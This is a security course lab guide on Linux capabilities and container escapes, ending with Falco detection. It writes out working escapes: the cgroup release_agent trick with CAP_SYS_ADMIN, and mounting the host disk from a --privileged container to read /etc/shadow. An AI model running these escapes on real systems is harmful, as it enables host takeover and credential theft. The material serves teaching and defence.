# Session 03 — Lab Guide

> Hands-on with Linux capabilities and container escapes. Target: 90 minutes.

---

## Setup (10 min)

```bash
# You need Docker installed. WSL2 Docker Desktop works.
docker --version

# Pull the test images we'll use
docker pull ubuntu:22.04
docker pull alpine:3.19
```

---

## Exercise 1 — See capabilities in action (15 min)

```bash
# 1. Default container — see what capabilities it has
docker run --rm -it ubuntu:22.04 bash -c "apt-get update -qq && apt-get install -y libcap2-bin -qq && capsh --print"
# Look at the "Current:" line. ~14 default capabilities.

# 2. Drop all caps — minimum surface
docker run --rm -it --cap-drop=ALL ubuntu:22.04 bash -c "apt-get update -qq 2>&1 | head -3"
# Watch: apt-get fails because it can't change network settings without caps.

# 3. Add a single specific cap back
docker run --rm -it --cap-drop=ALL --cap-add=NET_BIND_SERVICE alpine:3.19 sh -c "nc -lp 80 &"
# Binds to port 80 with no other privileges.

# 4. Compare to running as non-root
docker run --rm -it --cap-drop=ALL --user 1000 alpine:3.19 sh -c "id; capsh --print"
# Zero capabilities, non-root user — gold standard.
```

**Reflection question:** which approach is more secure — non-root user with caps, or root user with minimal caps? (Hint: think about file ownership, kernel call surface, and what happens when caps need to change.)

---

## Exercise 2 — CAP_SYS_ADMIN container escape (30 min)

This is the canonical "convenient but catastrophic" cap. Most tutorials say "just add `--cap-add SYS_ADMIN`" — you should know exactly what that means.

```bash
# Start a container with SYS_ADMIN (and a few related caps that the escape needs)
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:22.04 bash

# Inside the container — confirm we have SYS_ADMIN
apt-get update -qq && apt-get install -y libcap2-bin -qq
capsh --print | grep cap_sys_admin

# Now perform the cgroup v1 release_agent escape
# (This works on systems still using cgroups v1; many modern systems use v2)

mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || echo "cgroup v1 not available"

# If the above worked, continue:
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
cat > /cmd <<'EOF'
#!/bin/sh
ps -ef > /output
EOF
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Wait a second, then check /output — it contains host process list
cat /output

# You just executed a command on the host, from inside the container.
```

**If this didn't work** (cgroups v2 system, hardened distro), the principle still applies. Read CVE-2022-0492 advisory and understand why.

**Defender's view:** what would catch this? `auditd` rules on `mount` syscalls, Falco rule on `release_agent` writes.

---

## Exercise 3 — `--privileged` is full host access (15 min)

```bash
# Start a privileged container
docker run --rm -it --privileged ubuntu:22.04 bash

# Inside — you now have full root on the host kernel
# List host devices (visible from inside because no device namespace isolation in privileged mode)
ls /dev | head -20

# Mount the host's root filesystem
mount /dev/sda1 /mnt 2>/dev/null || mount $(df / | tail -1 | awk '{print $1}') /mnt

# Now /mnt is the host's root filesystem
ls /mnt/etc/shadow
cat /mnt/etc/shadow | head -3
```

**Don't actually do this on a system you care about.** The point is: `--privileged` is host root.

---

## Exercise 4 — Detection with Falco (20 min)

```bash
# Run Falco locally — it watches the kernel via eBPF
docker run -d --rm --name falco \
  --privileged \
  -v /var/run/docker.sock:/host/var/run/docker.sock \
  -v /dev:/host/dev \
  -v /proc:/host/proc:ro \
  -v /boot:/host/boot:ro \
  -v /lib/modules:/host/lib/modules:ro \
  -v /usr:/host/usr:ro \
  -v /etc:/host/etc:ro \
  falcosecurity/falco-no-driver:latest

# In another terminal — trigger something Falco will detect
docker run --rm -it ubuntu:22.04 bash -c "echo 'test' >> /etc/shadow"  # Falco: "Write below etc"

# Watch the Falco logs
docker logs -f falco | grep WARNING

# Stop Falco
docker stop falco
```

**Falco rules to study:** read https://github.com/falcosecurity/rules/blob/main/rules/falco_rules.yaml — specifically the "Container Escape" and "Privileged Container" rules.

---

## Acceptance Criteria

- [ ] Confirmed default container capability set
- [ ] Successfully reduced and elevated specific capabilities
- [ ] Attempted CAP_SYS_ADMIN escape (worked or understood why it didn't on your system)
- [ ] Understood `--privileged` = full host root
- [ ] Falco running locally; saw at least 1 detection event

---

## Reading

- `man 7 capabilities` — read in full
- Falco rules: https://github.com/falcosecurity/rules
- CVE-2022-0492 deep dive: https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/
- "A compendium of container escapes" — DEFCON talks (search YouTube)
